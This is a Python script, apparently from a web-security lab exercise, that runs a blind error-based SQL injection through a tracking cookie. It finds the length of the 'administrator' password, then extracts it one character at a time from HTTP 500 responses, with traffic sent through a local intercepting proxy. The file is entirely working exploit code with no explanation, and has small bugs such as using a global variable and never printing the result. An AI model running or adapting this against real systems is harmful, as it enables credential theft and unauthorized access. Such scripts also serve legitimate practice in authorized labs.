import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies= {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def get_pass_len(url):

    for len in range(1,30):
        payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password)=%s) ||' " %len
        cookie = {
            "TrackingId" : "pEtBiZ5RAcGnVJ6W" + payload,
            "session" : "Ub36XplhAvvk6N1ER6SRFDrQbIlYWnMG"
        }
        
        res = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

        sys.stdout.write('\r' + str(len))
        sys.stdout.flush()

        if res.status_code == 500:
            return len
        
    return False

def get_admin_pass(url, pass_len):
    password = ""

    for len in range(1,pass_length+1):
        for char in range(32,127):
            payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ascii(SUBSTR(password,%s,1))='%s') ||'" %(len,char)
            cookie = {
            "TrackingId" : "pEtBiZ5RAcGnVJ6W" + payload,
            "session" : "Ub36XplhAvvk6N1ER6SRFDrQbIlYWnMG"
            }
            
            res = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

            sys.stdout.write('\r' + password + chr(char))
            sys.stdout.flush()

            if(res.status_code == 500):
                password += chr(char)
                break
    return password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip();
    except IndexError:
        print("[-] invalid input")
        print("[-] %s <url>" %sys.argv[0])

    # find the length of the password
    pass_length = get_pass_len(url)
    print()

    # find the password of username 'administrator' 
    password_administrator = get_admin_pass(url, pass_length)